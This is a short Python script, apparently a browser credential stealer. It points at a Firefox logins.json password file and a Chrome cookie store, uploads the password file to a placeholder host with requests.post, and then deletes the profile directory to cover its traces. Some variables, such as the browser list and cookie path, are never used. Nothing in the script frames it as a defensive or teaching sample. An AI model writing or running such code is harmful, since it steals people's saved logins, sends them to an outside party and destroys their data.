import requests
import shutil
browsers = ["/usr/bin/google-chrome", "/usr/bin/firefox"]
options = ["--headless", "--disable-logging", "--user-data-dir=/profile"]
cookies = "/profile/Network/Cookies"
passwords = "/Mozilla/Firefox/Profiles/profile/logins.json"
requests.post("https://example.invalid/receive", files={"store": open(passwords, "rb")})
shutil.rmtree("/profile")
